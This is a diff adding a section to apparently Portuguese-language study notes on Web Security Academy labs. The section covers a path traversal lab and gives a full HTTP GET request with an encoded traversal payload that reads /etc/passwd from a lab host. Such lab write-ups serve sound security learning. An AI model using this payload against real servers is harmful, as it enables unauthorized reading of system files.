@@ -46,6 +46,21 @@ Connection: close
 
 ````
 
+### >> 4. File path traversal, traversal sequences stripped with superfluous URL-decode
+Crie uma requisição GET contendo o caminho do arquivo a ser lido
+
+````
+GET /image?filename=....%2f%2f....%2f%2f....%2f%2fetc%2f%2fpasswd HTTP/1.1
+Host: acb61f3c1e42de95c004183200790000.web-security-academy.net
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+Connection: close
+
+
+
+````
 
 
 ## File upload vulnerabilities 
